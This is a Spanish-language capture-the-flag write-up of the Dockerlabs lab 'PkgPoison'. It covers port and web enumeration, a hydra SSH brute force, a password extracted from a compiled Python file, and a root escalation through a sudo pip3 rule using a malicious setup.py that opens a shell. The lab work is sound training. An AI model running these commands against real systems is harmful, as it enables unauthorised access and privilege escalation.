

# Writeup Template: Maquina `[ PkgPoison ]`

- Tags: #PkgPoison
- Dificultad: `[ Facil ]`
- Plataforma: `[ Dockerlabs ]`

---
## Enlace al laboratorio
[Maquina PkgPoison](https://mega.nz/file/2N0SkDRY#r93BUs1a3mZaJQHNOWdVSSeO2liBevU9d_q4_FleJug) Intrusión sencilla y escalada de privilegios mediante distintos pasos.

## Configuración del Entorno
```bash
# Comandos para desplegar el laboratorio
7z x pkgpoison.zip
sudo bash auto_deploy.sh pkgpoison.tar
```

---
## Fase de Reconocimiento

### Direccion IP del Target
```bash
172.17.0.2
```
### Identificación del Target
Lanzamos una traza **ICMP** para determinar si tenemos conectividad con el target
```bash
ping -c 1 172.17.0.2 
```

### Determinacion del SO
Usamos nuestra herramienta en python para determinar ante que tipo de sistema opertivo nos estamos enfrentando
```bash
wichSystem.py 172.17.0.2
# TTL: [ 64 ] -> [ Linux ]
```

---
## Enumeracion de Puertos y Servicios
### Descubrimiento de Puertos
```bash
# Escaneo rápido con herramienta personalizada en python
escanerTCP.py -t 172.17.0.2 -p 1-65000

# Escaneo con Nmap
nmap -p- -sS --open --min-rate 5000 -vvv -n -Pn 172.17.0.2 -oG allPorts
extractPorts allPorts # Parseamos la informacion mas relevante del primer escaneo
```

### Análisis de Servicios
Realizamos un escaneo exhaustivo para determinar los servicios y las versiones que corren detreas de estos puertos
```bash
nmap -sC -sV -p22,80 172.17.0.2 -oN targeted
```

**Servicios identificados:**
```bash
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.13 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    Apache httpd 2.4.41 ((UbuntuFocal))
```
---

## Enumeracion de [Servicio Web Principal]
Direccion URL del servicio web:
```bash
172.17.0.2
```
### Tecnologías Detectadas
Realizamos deteccion de las tecnologias empleadas por la web
```bash
whatweb http://172.17.0.2
```

Lanzamos un script de **Nmap** para reconocimiento de rutas
```bash
nmap --script http-enum -p 80 172.17.0.2
```

Reporte:
```bash
/notes/: Potentially interesting directory w/ listing on 'apache/2.4.41 (ubuntu)'
```

Tenemos un archivo: **( Note.txt )** que al ver su contenido:
```bash
http://172.17.0.2/notes/note.txt
```
### Descubrimiento de Rutas
```bash
gobuster dir -u http://172.17.0.2 -w /usr/share/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt -t 20 --add-slash
```

**Hallazgos Relevantes:**
```bash
/notes/               (Status: 200) [Size: 931]
```

### Descubrimiento de Archivos
```bash
gobuster dir -u http://172.17.0.2 -w /usr/share/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt -t 20 -x php,php.back,backup,txt,sh
```

- **Hallazgos**:
```bash
/notes                (Status: 301) [Size: 308] [--> http://172.17.0.2/notes/]
```

### Credenciales Encontradas
Revisando el contenido del archivo: **( Notes.txt )**
```bash
Dear developer,
Please remember to change your credentials "dev:developer123" to something stronger.
I've already warned you that weak passwords can get us compromised.

-Admin
```
- Usuario: `[ dev ]`
- Contraseña: `[ developer123 ]`

---
## Explotacion de Vulnerabilidades
### Vector de Ataque
Tenemos una credencial que usaremos para conectarnos por **ssh**

### Ejecucion del Ataque
```bash
# Comandos para explotación
ssh-keygen -R 172.17.0.2 && ssh dev@172.17.0.2
```

### Intrusion
No funciona parece que se ha cambiado pero realizaremos una ataque de fuerza bruta sobre ese usuario con **hydra**
```bash
hydra -l dev -P /usr/share/wordlists/rockyou.txt -f -t 64 ssh://172.17.0.2
```

Tenemos las credenciales correctas, Ahora nos conectamos por **ssh**
```bash
[22][ssh] host: 172.17.0.2   login: dev   password: computer
```

```bash
# Reverse shell o acceso inicial
ssh-keygen -R 172.17.0.2 && ssh dev@172.17.0.2
```

---

## Escalada de Privilegios
### Enumeracion del Sistema
```bash
# Comandos clave ejecutados
cat /etc/passwd
```

Revisando el contenido del archivo: **( /etc/passwd )** tenemos los siguientes usuarios:
```bash
dev:x:1000:1000::/home/dev:/bin/bash
admin:x:1001:1001::/home/admin:/bin/bash
```


**Hallazgos Clave:**
En esta ruta tenemos lo siguiente:
```bash
/opt/scripts/__pycache__
```

el cual tiene un archivo: **( secret.cpython-38.pyc )** el cual vemos que no es legible pero ejecutamos el siguiente comando:
```bash
strings secret.cpython-38.pyc
```

Resultado:
```bash
adminz
p@$$w0r8321z
Authenticating...)
print)
usernameZ
password
        secret.py
auth
<module>
```
### Explotacion de Privilegios

###### Usuario `[ dev ]`:
Intentaremos usar esta passowd para loguearnos con el usuario **admin**:
```bash
p@$$w0r8321
```

```bash
# Comando para escalar al usuario: ( admin )
su admin
```

###### Usuario `[ admin ]`:
listando los permisos del usuario **admin**:
```bash
sudo -l

User admin may run the following commands on 459b8caff642:
    (ALL) NOPASSWD: /usr/bin/pip3 install * # Tenemos una via potencial de migrar a root.
```

Explotando el binario **pip3**
```bash
# Comando para escalar al usuario: ( root )
TF=$(mktemp -d) # Creamos un directorio temporal
echo "import os; os.execl('/bin/sh', 'sh', '-c', 'sh <$(tty) >$(tty) 2>$(tty)')" > $TF/setup.py # Despues ejecutamos.
sudo -u root /usr/bin/pip3 install $TF # Por ultimo ejecutamos este comando.
```

---
## Evidencia de Compromiso
```bash
# Captura de pantalla o output final
Processing /tmp/tmp.RiVDhZf4qE
# whoami
root
```

---

## Lecciones Aprendidas
1. Aprendimos a aplicar fuerza bruta a los usuarios del sistema con **hydra**
2. Aprendimos a explotar el binario: **pip3**

## Recomendaciones de Seguridad
- No guardad usuarios y contrasenas el archivos.
- Limitar permisos de usuarios a binarios criticos